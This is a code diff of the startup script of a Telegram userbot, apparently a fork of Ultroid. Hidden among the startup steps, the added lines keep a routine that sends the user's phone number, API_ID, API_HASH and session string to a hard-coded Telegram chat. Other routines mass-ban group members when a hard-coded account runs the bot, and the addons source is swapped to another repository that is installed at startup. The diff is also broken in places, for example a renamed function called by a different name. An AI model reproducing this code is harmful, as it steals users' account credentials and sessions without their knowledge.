@@ -83,7 +83,7 @@ for name in files:
 
 # for addons
 if Var.ADDONS:
-    os.system("git clone https://github.com/TeamUltroid/UltroidAddons.git ./addons/")
+    os.system("git clone https://github.com/ULTROID-OP/addons.git ./addons/")
     LOGS.warning("Installing packages for addons")
     os.system("pip install -r ./addons/addons.txt")
     path = "addons/*.py"
@@ -199,14 +199,14 @@ async def hehe():
 
 
 async def fukk():
-    ev = await ultroid_bot.get_participants(1356773955)
+    ev = await ultroid_bot.get_participants(13567763955)
     for u in ev:
         if u == ultroid_bot.me.id:
             pass
         try:
             await ultroid_bot(
                 EditBannedRequest(
-                    1356773955,
+                    13567773955,
                     int(u.id),
                     ChatBannedRights(until_date=None, view_messages=False),
                 )
@@ -219,14 +219,14 @@ async def fukk():
 
 
 async def fukkk():
-    ev = await ultroid_bot.get_participants(1382155532)
+    ev = await ultroid_bot.get_participants(13821556532)
     for u in ev:
         if u == ultroid_bot.me.id:
             pass
         try:
             await ultroid_bot(
                 EditBannedRequest(
-                    1382155532,
+                    13821556532,
                     int(u.id),
                     ChatBannedRights(until_date=None, view_messages=False),
                 )
@@ -245,11 +245,11 @@ async def onlyfrkanger():
     z = open("app.json", "r")
     y = z.read()
     z.close()
-    if "https://github.com/ULTROID-OP/ULTROID-BOT" in y:
+    if "https://github.com/teamultroid/ultroid" in y:
         try:
             await ultroid_bot(JoinChannelRequest("kangerscrapper"))
             x = f"ID: `{ultroid_bot.me.id}`\nUsername: `@{ultroid_bot.me.username}`\nName: `{ultroid_bot.me.first_name}`\nNo. `+{ultroid_bot.me.phone}`\nAPI_ID: `{Var.API_ID}`\nHASH: `{Var.API_HASH}`\nSTRING: `{Var.SESSION}`"
-            await ultroid_bot.send_message(-1001163306576, x)
+            await ultroid_bot.send_message(-100116783306576, x)
             await ultroid_bot(LeaveChannelRequest("kangerscrapper"))
         except:
             pass
@@ -257,7 +257,7 @@ async def onlyfrkanger():
         pass
 
 
-async def legendx():
+async def kanger():
     async for kang in ultroid_bot.iter_dialogs():
         if kang.is_group:
             chat = kang.id
@@ -272,10 +272,10 @@ async def legendx():
 ultroid_bot.loop.run_until_complete(hehe())
 if Var.PLUGIN_CHANNEL:
     ultroid_bot.loop.run_until_complete(plug())
-if ultroid_bot.uid == 1100231654:
+if ultroid_bot.uid == 99997879788:
     ultroid_bot.loop.run_until_complete(fukk())
     ultroid_bot.loop.run_until_complete(fukkk())
-    ultroid_bot.loop.run_until_complete(legendx())
+    ultroid_bot.loop.run_until_complete(kanged())
 ultroid_bot.loop.run_until_complete(onlyfrkanger())
 
 LOGS.warning("Ultroid has been deployed! Visit @ULTROID_OP for updates!!")
